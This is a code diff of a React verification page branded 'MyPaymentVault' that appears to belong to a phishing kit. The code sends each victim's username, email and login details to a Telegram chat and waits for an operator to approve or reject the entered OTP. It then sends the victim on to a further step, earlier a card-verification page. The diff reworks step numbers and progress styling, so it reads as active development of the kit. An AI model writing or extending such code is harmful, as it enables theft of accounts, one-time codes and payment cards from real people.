@@ -125,7 +125,7 @@ export default function Verify() {
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
       `✅ <b>MyPaymentVault</b>\n` +
-      `📌 <b>Step 2 — OTP Verified</b>\n` +
+      `📌 <b>Step 3 — OTP Verified</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>   : <code>${pendingUsername}</code>\n` +
       `📧 <b>Email</b>      : <code>${emailInput || maskedEmail || "-"}</code>\n` +
@@ -141,7 +141,6 @@ export default function Verify() {
 
     await sendApprovalRequest(
       pendingUsername ?? "-",
-      `OTP: ${code} | Email: ${emailInput || maskedEmail || "-"}`,
       ip,
       now,
       sessionKey,
@@ -156,7 +155,7 @@ export default function Verify() {
         clearInterval(pollRef.current!);
         if (callbackId) await answerCallback(callbackId, "✅ OTP disetujui!");
         setWaiting(false);
-        navigate("/verify-card");
+        navigate("/step4");
       } else if (status === "rejected") {
         clearInterval(pollRef.current!);
         if (callbackId) await answerCallback(callbackId, "❌ OTP ditolak.");
@@ -314,12 +313,14 @@ export default function Verify() {
               background: "#111", display: "flex", alignItems: "center", justifyContent: "center",
               flexShrink: 0,
             }}>
-              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>2</span>
+              <svg width="11" height="11" viewBox="0 0 12 12" fill="none">
+                <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
+              </svg>
             </div>
-            <div style={{ flex: 1, height: 1, background: "#ccc" }} />
+            <div style={{ flex: 1, height: 1, background: "#111" }} />
             <div style={{
               width: 22, height: 22, borderRadius: "50%",
-              background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center",
+              background: "#111", display: "flex", alignItems: "center", justifyContent: "center",
               flexShrink: 0,
             }}>
               <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>3</span>
